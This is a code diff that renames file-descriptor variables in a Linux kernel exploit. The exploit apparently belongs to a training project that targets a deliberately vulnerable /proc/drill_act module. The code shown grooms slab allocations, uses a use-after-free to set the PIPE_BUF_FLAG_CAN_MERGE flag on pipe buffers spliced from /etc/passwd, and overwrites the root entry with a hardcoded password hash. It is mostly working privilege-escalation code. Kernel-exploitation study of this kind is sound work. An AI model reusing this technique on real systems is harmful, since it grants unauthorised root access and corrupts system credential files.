@@ -44,7 +44,7 @@ void do_cpu_pinning(void)
 	printf("[+] pinned to CPU #0\n");
 }
 
-int act(int fd, int code, int n, char *args)
+int act(int act_fd, int code, int n, char *args)
 {
 	char buf[DRILL_ACT_SIZE] = { 0 };
 	size_t len = 0;
@@ -58,7 +58,7 @@ int act(int fd, int code, int n, char *args)
 	len = strlen(buf) + 1; /* with null byte */
 	assert(len <= DRILL_ACT_SIZE);
 
-	bytes = write(fd, buf, len);
+	bytes = write(act_fd, buf, len);
 	if (bytes <= 0) {
 		perror("[-] write");
 		return EXIT_FAILURE;
@@ -105,7 +105,7 @@ int pipe_fds[PIPES_N][2];
 
 /* Write to /etc/passwd after the "root:" word at the beginning of the file */
 #define PASSWD_OFFSET	4
-int file_fd = 0;
+int passwd_fd = 0;
 
 /* The hash generaged with `openssl passwd -1 -salt root pwn` */
 char *pwd = "$1$root$c1pi5nHqxDexgFYdvJoZB.:0:0:root:/root:/bin/bash\n";
@@ -137,8 +137,8 @@ int prepare_pipes(void)
 	fclose(file_s);
 	fclose(file_bkp_s);
 
-	file_fd = open("/etc/passwd", O_RDONLY);
-	if (file_fd < 0) {
+	passwd_fd = open("/etc/passwd", O_RDONLY);
+	if (passwd_fd < 0) {
 		perror("[-] open");
 		return EXIT_FAILURE;
 	}
@@ -223,7 +223,7 @@ end:
 int main(void)
 {
 	int ret = EXIT_FAILURE;
-	int fd = -1;
+	int act_fd = -1;
 	long i = 0;
 	long current_n = 0;
 	long reserved_from_n = 0;
@@ -243,8 +243,8 @@ int main(void)
 	if (ret == EXIT_FAILURE)
 		goto end;
 
-	fd = open("/proc/drill_act", O_WRONLY);
-	if (fd < 0) {
+	act_fd = open("/proc/drill_act", O_WRONLY);
+	if (act_fd < 0) {
 		perror("[-] open drill_act");
 		goto end;
 	}
@@ -255,7 +255,7 @@ int main(void)
 
 	printf("[!] create new active slab, allocate objs_per_slab objects\n");
 	for (i = 0; i < OBJS_PER_SLAB; i++) {
-		if (act(fd, DRILL_ACT_ALLOC, current_n + i, NULL) == EXIT_FAILURE) {
+		if (act(act_fd, DRILL_ACT_ALLOC, current_n + i, NULL) == EXIT_FAILURE) {
 			printf("[-] DRILL_ACT_ALLOC\n");
 			goto end;
 		}
@@ -266,7 +266,7 @@ int main(void)
 
 	printf("[!] allocate (objs_per_slab * cpu_partial) objects to later overflow the partial list\n");
 	for (i = 0; i < OBJS_PER_SLAB * CPU_PARTIAL; i++) {
-		if (act(fd, DRILL_ACT_ALLOC, current_n + i, NULL) == EXIT_FAILURE) {
+		if (act(act_fd, DRILL_ACT_ALLOC, current_n + i, NULL) == EXIT_FAILURE) {
 			printf("[-] DRILL_ACT_ALLOC\n");
 			goto end;
 		}
@@ -276,7 +276,7 @@ int main(void)
 
 	printf("[!] create new active slab, allocate objs_per_slab objects\n");
 	for (i = 0; i < OBJS_PER_SLAB; i++) {
-		if (act(fd, DRILL_ACT_ALLOC, current_n + i, NULL) == EXIT_FAILURE) {
+		if (act(act_fd, DRILL_ACT_ALLOC, current_n + i, NULL) == EXIT_FAILURE) {
 			printf("[-] DRILL_ACT_ALLOC\n");
 			goto end;
 		}
@@ -290,7 +290,7 @@ int main(void)
 
 	printf("[!] create new active slab, allocate objs_per_slab objects\n");
 	for (i = 0; i < OBJS_PER_SLAB; i++) {
-		if (act(fd, DRILL_ACT_ALLOC, current_n + i, NULL) == EXIT_FAILURE) {
+		if (act(act_fd, DRILL_ACT_ALLOC, current_n + i, NULL) == EXIT_FAILURE) {
 			printf("[-] DRILL_ACT_ALLOC\n");
 			goto end;
 		}
@@ -302,7 +302,7 @@ int main(void)
 	current_n--; /* point to the last allocated */
 	current_n--; /* don't free the last allocated to keep this active slab */
 	for (i = 0; i < OBJS_PER_SLAB * 2 - 1; i++) {
-		if (act(fd, DRILL_ACT_FREE, current_n - i, NULL) == EXIT_FAILURE) {
+		if (act(act_fd, DRILL_ACT_FREE, current_n - i, NULL) == EXIT_FAILURE) {
 			printf("[-] DRILL_ACT_FREE\n");
 			goto end;
 		}
@@ -313,7 +313,7 @@ int main(void)
 
 	printf("[!] free 1 out of each objs_per_slab objects in reserved slabs to clean up the partial list\n");
 	for (i = 0; i < OBJS_PER_SLAB * CPU_PARTIAL; i += OBJS_PER_SLAB) {
-		if (act(fd, DRILL_ACT_FREE, reserved_from_n + i, NULL) == EXIT_FAILURE) {
+		if (act(act_fd, DRILL_ACT_FREE, reserved_from_n + i, NULL) == EXIT_FAILURE) {
 			printf("[-] DRILL_ACT_FREE\n");
 			goto end;
 		}
@@ -334,7 +334,7 @@ int main(void)
 		}
 
 		/* N.B. splice modifies the file_offset value, so we reset it on each loop iteration */
-		bytes = splice(file_fd, &file_offset, pipe_fds[i][1], NULL, 1, 0);
+		bytes = splice(passwd_fd, &file_offset, pipe_fds[i][1], NULL, 1, 0);
 		if (bytes < 0) {
 			perror("[-] splice");
 			goto end;
@@ -351,7 +351,7 @@ int main(void)
 	 *  - flags in pipe_buffer are at the offset 24;
 	 *  - DRILL_ACT_SAVE_VAL with 8 as 2nd argument also starts at the offset 24.
 	 */
-	ret = act(fd, DRILL_ACT_SAVE_VAL, uaf_n, STR(PIPE_BUF_FLAG_CAN_MERGE) " 8");
+	ret = act(act_fd, DRILL_ACT_SAVE_VAL, uaf_n, STR(PIPE_BUF_FLAG_CAN_MERGE) " 8");
 	if (ret == EXIT_FAILURE)
 		goto end;
 	printf("[+] DRILL_ACT_SAVE_VAL\n");
@@ -398,18 +398,18 @@ end:
 		}
 	}
 
-	if (file_fd >= 0) {
-		ret = close(file_fd);
+	if (passwd_fd >= 0) {
+		ret = close(passwd_fd);
 		if (ret != 0)
-			perror("[-] close file_fd");
-		printf("  closed the file_fd\n");
+			perror("[-] close passwd_fd");
+		printf("  closed the passwd_fd\n");
 	}
 
-	if (fd >= 0) {
-		ret = close(fd);
+	if (act_fd >= 0) {
+		ret = close(act_fd);
 		if (ret != 0)
-			perror("[-] close fd");
-		printf("  closed the drill_act fd\n");
+			perror("[-] close act_fd");
+		printf("  closed the drill_act act_fd\n");
 	}
 
 	return ret;
